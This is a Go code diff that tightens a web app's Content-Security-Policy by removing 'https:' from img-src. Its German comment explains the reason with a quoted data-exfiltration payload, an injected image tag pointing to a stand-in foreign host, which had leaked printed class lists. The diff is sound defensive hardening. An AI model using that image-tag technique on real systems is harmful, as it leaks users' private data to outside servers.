@@ -35,11 +35,27 @@ func SecurityHeadersMiddleware(next http.Handler) http.Handler {
 		// nur nach einem Umbau aller dynamischen Positionierungen auf CSS-Variablen
 		// entfernen; bis dahin wäre jede Änderung hier ein kaputter Designer.
 		//
-		// font-src: now only self (Google Fonts removed)
-		// img-src: self, data:, blob:, and https: (for external covers and blob URLs)
-		// script-src: self
-		// style-src: self and unsafe-inline (needed for Svelte inline style bindings)
-		w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data: blob: https:; connect-src 'self'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; object-src 'none';")
+		// img-src OHNE https: — seit dem 06.08.2026, und das war eine Änderung am
+		// Frontend, nicht nur an dieser Zeile.
+		//
+		// Das pauschale https: erlaubte Bilder von JEDEM fremden Server. Gemessen wurde,
+		// was das wert ist: Ein aus Stammdaten eingeschleustes
+		// <img src="https://fremder-host/?daten=…"> im Druckfenster lud anstandslos und
+		// trug den Inhalt der gedruckten Klassenliste nach draußen — Skripte blockiert die
+		// Richtlinie, Bilder waren der offene Weg.
+		//
+		// Gebraucht wurde https: von sieben Ansichten, die Cover direkt bei Google Books
+		// und OpenLibrary holten. Das war ohnehin die falsche Bauweise: Es meldete den
+		// Browser jeder Lehrkraft bei einem Dritten an und gab preis, welche ISBNs die
+		// Schule gerade ansieht. Alle sieben laufen jetzt über den eigenen Cover-Proxy
+		// (frontend/src/lib/utils/coverSrc.js, Allowlist in api/image_caching.go) — die
+		// Bilder kommen unverändert an, nur eben vom eigenen Server.
+		//
+		// data: und blob: bleiben: erzeugte Barcodes/QR-Codes und Datei-Vorschauen vor
+		// dem Hochladen.
+		//
+		// style-src behält 'unsafe-inline' (Begründung oben), script-src bleibt 'self'.
+		w.Header().Set("Content-Security-Policy", "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data: blob:; connect-src 'self'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'; object-src 'none';")
 
 		w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
 		w.Header().Set("Referrer-Policy", "strict-origin-when-cross-origin")
